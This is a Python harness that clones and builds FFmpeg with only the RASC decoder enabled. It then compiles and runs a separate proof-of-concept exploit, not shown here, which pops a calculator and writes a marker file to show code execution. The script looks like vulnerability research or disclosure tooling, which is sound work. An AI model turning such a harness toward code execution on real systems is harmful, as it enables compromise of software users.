import argparse
import os
import platform
import shutil
import subprocess
import sys
from pathlib import Path


def in_wsl():
    if "WSL_DISTRO_NAME" in os.environ:
        return True
    try:
        return "microsoft" in Path("/proc/version").read_text(errors="ignore").lower()
    except OSError:
        return False


def host_name():
    name = platform.system().lower()
    if in_wsl():
        return "wsl"
    if name == "darwin":
        return "macos"
    if name == "linux":
        return "linux"
    if name == "windows":
        return "windows"
    return name or "unknown"


def command_program(command):
    parts = command.split()
    if len(parts) >= 2 and parts[0].lower() in {"cmd.exe", "cmd"} and parts[1].lower() == "/c":
        return parts[0]
    return parts[0] if parts else ""


def command_exists(command):
    program = command_program(command)
    if not program:
        return False
    if program.lower() == "open" and host_name() == "macos":
        return shutil.which("open") is not None
    if program.lower() in {"cmd.exe", "powershell.exe"} and host_name() == "windows":
        return True
    return shutil.which(program) is not None


def calc_candidates():
    host = host_name()
    if host == "macos":
        return ["open -a Calculator"]
    if host == "windows":
        return ["cmd.exe /c start calc.exe", "powershell.exe -NoProfile -Command Start-Process calc.exe"]
    if host == "wsl":
        return [
            "powershell.exe -NoProfile -Command Start-Process calc.exe",
            "cmd.exe /c start calc.exe",
            "gnome-calculator",
            "kcalc",
            "mate-calc",
            "qalculate-gtk",
            "xcalc",
        ]
    return ["gnome-calculator", "kcalc", "mate-calc", "qalculate-gtk", "xcalc"]


def choose_calc_command(preferred):
    if preferred:
        return preferred
    for command in calc_candidates():
        if command_exists(command):
            return command
    return ""


def run(args, cwd=None, env=None):
    print("+ " + " ".join(str(x) for x in args), flush=True)
    subprocess.run([str(x) for x in args], cwd=cwd, env=env, check=True)


def require_tool(name):
    path = shutil.which(name)
    if not path:
        raise SystemExit(f"missing required tool: {name}")
    return path


def clone_ffmpeg(src, ref):
    if (src / ".git").exists():
        run(["git", "-C", src, "fetch", "--depth", "1", "origin", ref])
        run(["git", "-C", src, "checkout", "FETCH_HEAD"])
        return
    run(["git", "clone", "--depth", "1", "https://github.com/FFmpeg/FFmpeg.git", src])
    if ref and ref != "master":
        run(["git", "-C", src, "fetch", "--depth", "1", "origin", ref])
        run(["git", "-C", src, "checkout", "FETCH_HEAD"])


def compiler():
    for name in [os.environ.get("CC"), "cc", "gcc", "clang"]:
        if name and shutil.which(name):
            return name
    raise SystemExit("missing C compiler: set CC or install gcc/clang")


def build_poc(options):
    root = Path(__file__).resolve().parents[1]
    src = Path(options.ffmpeg_src).expanduser().resolve()
    build = Path(options.build_dir).expanduser().resolve()
    output = Path(options.output).expanduser().resolve()
    source_file = root / "poc" / "ffmpeg_rasc_dlta_calc_poc_portable.c"
    cc = compiler()

    require_tool("git")
    require_tool("make")
    clone_ffmpeg(src, options.ffmpeg_ref)
    build.mkdir(parents=True, exist_ok=True)

    configure = [
        src / "configure",
        "--enable-debug",
        "--disable-doc",
        "--disable-stripping",
        "--disable-x86asm",
        "--disable-programs",
        "--disable-autodetect",
        "--disable-everything",
        "--enable-zlib",
        "--enable-decoder=rasc",
    ]
    run(configure, cwd=build)
    run(["make", f"-j{options.jobs}", "libavcodec/libavcodec.a", "libavutil/libavutil.a"], cwd=build)

    libs = ["-lz", "-lm", "-pthread"]
    if host_name() not in {"macos", "windows"}:
        libs.append("-ldl")

    compile_cmd = [
        cc,
        "-g",
        "-O0",
        f"-I{build}",
        f"-I{src}",
        source_file,
        build / "libavcodec/libavcodec.a",
        build / "libavutil/libavutil.a",
        *libs,
        "-o",
        output,
    ]
    run(compile_cmd)
    return output


def run_poc(binary, calc_command):
    env = os.environ.copy()
    if calc_command:
        env["RASC_CALC_CMD"] = calc_command
        print(f"selected calc command: {calc_command}", flush=True)
    else:
        print("no local calculator command found; marker file still proves callback execution", flush=True)
    run([binary], env=env)
    marker = Path("ffmpeg_rasc_dlta_calc_poc_marker.txt") if host_name() == "windows" else Path("/tmp/ffmpeg_rasc_dlta_calc_poc_marker")
    if marker.exists():
        print(f"marker:present {marker}", flush=True)
    else:
        print(f"marker:missing {marker}", flush=True)


def main():
    parser = argparse.ArgumentParser(description="Build and run the portable FFmpeg RASC DLTA calc PoC for this OS.")
    parser.add_argument("--mode", choices=["print", "build", "run"], default="run")
    parser.add_argument("--ffmpeg-src", default="/tmp/ffmpeg-rasc-dlta-src")
    parser.add_argument("--build-dir", default="/tmp/ffmpeg-rasc-dlta-build")
    parser.add_argument("--output", default="./ffmpeg_rasc_dlta_calc_poc_portable")
    parser.add_argument("--ffmpeg-ref", default="master")
    parser.add_argument("--calc-cmd", default="")
    parser.add_argument("--jobs", default=str(os.cpu_count() or 4))
    options = parser.parse_args()

    calc_command = choose_calc_command(options.calc_cmd)
    print(f"host: {host_name()}", flush=True)
    print(f"calc command: {calc_command or 'not found'}", flush=True)

    if options.mode == "print":
        return

    binary = build_poc(options)
    if options.mode == "run":
        run_poc(binary, calc_command)


if __name__ == "__main__":
    try:
        main()
    except subprocess.CalledProcessError as exc:
        sys.exit(exc.returncode)
